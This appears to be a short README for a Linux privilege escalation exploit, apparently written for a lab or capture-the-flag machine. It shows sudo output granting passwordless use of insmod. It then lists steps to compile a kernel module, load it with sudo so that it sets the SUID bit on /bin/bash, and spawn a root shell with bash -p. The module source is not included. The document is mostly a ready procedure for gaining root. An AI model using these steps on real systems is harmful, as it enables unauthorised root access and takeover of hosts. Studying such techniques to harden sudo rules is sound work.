## Privilege Escalation via insmod (Linux Kernel Module Exploit)
```
user@ip-10-10-69-32:~$ sudo -l
Matching Defaults entries for user on ip-10-10-69-32:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on ip-10-10-69-32:
    (ALL) NOPASSWD: /sbin/insmod
user@ip-10-10-69-32:~$ 
```
The exploit creates a kernel module (exploit.ko). When loaded via sudo insmod, the module sets the SUID bit on /bin/bash.
Running /bin/bash -p then grants root privileges.

## Usage
1. Compile the Exploit
```
make
```
This generates exploit.ko, the kernel module.

2. Load the Malicious Kernel Module
```
sudo insmod exploit.ko
```
3. Gain Root Access 
```
/bin/bash -p
```
